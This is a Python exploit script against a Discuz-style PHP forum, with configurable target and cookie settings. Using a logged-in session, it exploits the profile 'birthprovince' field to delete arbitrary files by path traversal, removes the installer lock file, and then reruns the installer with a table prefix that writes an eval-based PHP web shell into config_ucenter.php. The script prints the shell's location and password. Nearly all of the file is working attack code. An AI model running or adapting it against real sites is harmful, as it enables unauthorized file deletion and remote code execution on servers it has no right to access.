import base64
import random
import re
import string

import requests

sess = requests.Session()
randstr = lambda len=5: ''.join(random.choice(string.ascii_lowercase) for _ in range(len))

##################################################
########## Customize these parameters ############
target = 'http://127.0.0.1'
# login target site first, and copy the cookie here
cookie = "YHri_2132_saltkey=zwS4z4PP; YHri_2132_lastvisit=1758026348; YHri_2132_ulastactivity=277e%2BhpuajTkXPD%2Bu2Go4MpwvLQQnMnN2acu3Q60LNyTzL81fJwc; YHri_2132_nofavfid=1; 1mIx_2132_saltkey=bNecieo4; jT5L_2132_saltkey=ThJBzujJ; jT5L_2132_lastvisit=1758027283; Rcul_2132_saltkey=C27mtFgF; Rcul_2132_lastvisit=1758027473; Rcul_2132_ulastactivity=7390GW5Ox%2B%2F9SmC9HWpkAGqymCxmBeA%2B1G5TTKYLhpyv7Mf8zdhg; Rcul_2132_nofavfid=1; EFpf_2132_saltkey=zG2TmK6M; 5ot3_2132_saltkey=vAIjjH6j; 5ot3_2132_lastvisit=1758468377; 5ot3_2132_sid=vL6B3l; 5ot3_2132_sendmail=1; 5ot3_2132_seccode=1.b2d56c01217b57793c; 5ot3_2132_ulastactivity=19a4BSqBzbiEBH20bQcbwGqnMYHIh28rCy3fMmYHdMK4DTiwFCld; 5ot3_2132_auth=1af1aaXEnngZ8h2NhUHbMRcEn2WTce5JzWddBL%2B5mpqBgRmZ8%2BxSZyX29WOmbg4M1N3zLAO4GIwR8OagwAXa; 5ot3_2132_nofavfid=1; 5ot3_2132_onlineusernum=1; 5ot3_2132_noticeTitle=1; 5ot3_2132_lastact=1758472054%09forum.php%09"
shell_password = randstr()
db_host = 'localhost'
db_user = 'root'
db_pw = 'root'
db_name = 'ultrax'
#################################################

path = '/home.php?mod=spacecp&ac=profile&op=base'
url = target + path

sess.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Referer': url})


# sess.proxies.update({'http': 'socks5://localhost:1080'})
# sess.proxies.update({'http': 'http://localhost:8080'})


def login(username=None, password=None):
    sess.headers.update({'Cookie': cookie})


def get_form_hash():
    r = sess.get(url)
    match = re.search(r'"member.php\?mod=logging&amp;action=logout&amp;formhash=(.*?)"', r.text, re.I)
    if match:
        return match.group(1)


def tamper(formhash, file_to_delete):
    data = {
        'formhash': (None, formhash),
        'profilesubmit': (None, 'true'),
        'birthprovince': (None, file_to_delete)
    }
    r = sess.post(url, files=data)
    if 'parent.show_success' in r.text:
        print('tamperred successfully')
        return True


def delete(formhash, file):
    if not tamper(formhash, file):
        return False

    image = b'iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAADUlEQVR4nGNgGAWkAwABNgABVtF/yAAAAABJRU5ErkJggg=='
    data = {
        'formhash': formhash,
        'profilesubmit': 'true'
    }
    files = {
        'birthprovince': ('image.png', base64.b64decode(image), 'image/png')
    }
    r = sess.post(url, data=data, files=files)
    if 'parent.show_success' in r.text:
        print('delete {} successfully'.format(file))
        return True


def getshell():
    install_url = target + '/install/index.php'
    r = sess.get(install_url)
    if '安装向导' not in r.text:
        print('install directory not exists')
        return False

    table_prefix = "x');@eval($_POST[{}]);#".format(shell_password)
    data = {
        'step': 3,
        'install_ucenter': 'yes',
        'dbinfo[dbhost]': db_host,
        'dbinfo[dbname]': db_name,
        'dbinfo[dbuser]': db_user,
        'dbinfo[dbpw]': db_pw,
        'dbinfo[tablepre]': table_prefix,
        'dbinfo[adminemail]': 'admin@admin.com',
        'admininfo[username]': 'admin',
        'admininfo[password]': 'admin',
        'admininfo[password2]': 'admin',
        'admininfo[email]': 'admin@admin.com',
        'submitname': '下一步'
    }
    r = sess.post(install_url, data=data)
    if 'CREATE TABLE' not in r.text:
        print('write shell failed')
        return False
    print('shell: {}/config/config_ucenter.php'.format(target))
    print('password: {}'.format(shell_password))


if __name__ == '__main__':
    login()
    form_hash = get_form_hash()
    if form_hash:
        delete(form_hash, '../../../data/install.lock')
        getshell()
    else:
        print('failed')